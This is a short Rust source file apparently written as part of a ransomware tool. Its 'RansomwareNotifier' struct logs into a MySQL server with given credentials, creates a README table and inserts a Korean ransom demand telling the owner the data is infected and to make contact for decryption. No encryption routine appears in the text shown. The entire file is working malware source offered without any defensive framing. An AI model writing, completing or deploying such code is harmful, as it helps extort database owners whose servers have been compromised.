use mysql::*;
use mysql::prelude::*;

pub struct RansomwareNotifier {
    pool: Pool,
}

impl RansomwareNotifier {
    pub fn new(user: &str, password: &str, url: &str, port: u16 , database: &str) -> Result<Self, mysql::Error> {
        let opts = OptsBuilder::new()
            .ip_or_hostname(Some(url))
			.tcp_port(port)
            .user(Some(user))
            .pass(Some(password))
            .db_name(Some(database));

        let pool = Pool::new(opts)?;
        Ok(RansomwareNotifier { pool })
    }

    pub fn initialize_database(&self) -> Result<(), mysql::Error> {
        let mut conn = self.pool.get_conn()?;

        // README 테이블 생성
        conn.query_drop(
            r"CREATE TABLE IF NOT EXISTS README (
                README TEXT NOT NULL
            )"
        )?;

        // 경고 메시지 삽입
        let warning_message = "당신은 랜섬웨어에 감염되었습니다. 복호화 하고 싶으면 연락주세요.";
        conn.exec_drop(
            r"INSERT INTO README (README) VALUES (?)",
            (warning_message,),
        )?;

        Ok(())
    }
}

